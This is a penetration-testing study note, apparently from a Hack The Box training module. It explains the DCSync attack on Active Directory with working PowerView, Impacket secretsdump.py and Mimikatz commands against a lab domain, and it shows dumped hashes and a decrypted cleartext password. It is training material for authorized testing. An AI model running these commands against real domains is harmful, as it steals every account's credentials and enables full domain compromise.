DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacketâ€™s secretsdump.py.

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes

requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

#### pre-request
have control over an account that has the rights to perform domain replication.
Domain/Enterprise Admins and default domain administrators have this right by default.

## ATTACK CHAIN
```
adunn user pwned
get sid for aducc
check ACL for adunn
DS-Replication ???
```

#### Using Get-DomainUser to View adunn's Group Membership
```powershell-session
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl


samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
```
#### Using Get-ObjectAcl to Check adunn's Replication Rights
```powershell-session
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

impacket
```shell-session
AhmaDb0x@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
[^1]
[^1]:  `secretsdump`
	We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:
	
	- Number and % of passwords cracked
	- top 10 passwords
	- Password length metrics
	- Password re-use

#### Listing Hashes, Kerberos Keys, and Cleartext Passwords
```shell-session
AhmaDb0x@htb[/htb]$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

#### Viewing an Account with Reversible Encryption Password Storage Set

passwords are `NOT` stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:

#### Enumerating Further using Get-ADUser
```powershell-session
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

#### Checking for Reversible Encryption Option using Get-DomainUser
```powershell-session
PS C:\htb> Get-DomainUser -Identity syncron | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

#### Displaying the Decrypted Password
```shell-session
AhmaDb0x@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.

###  Mimikatz
Using Mimikatz, we must target a specific user.
target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.


Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this: <> adunn

```cmd-session
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

```powershell-session
PS C:\htb> .\mimikatz.exe
```

```powershell-session
mimikatz # privilege::debug
```

```powershell-session
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```


## Moving On

In the next section, we'll see some ways to enumerate and take advantage of remote access rights that may be granted to a user we control. These methods include Remote Desktop Protocol (RDP), WinRM (or PsRemoting), and SQL Server admin access.
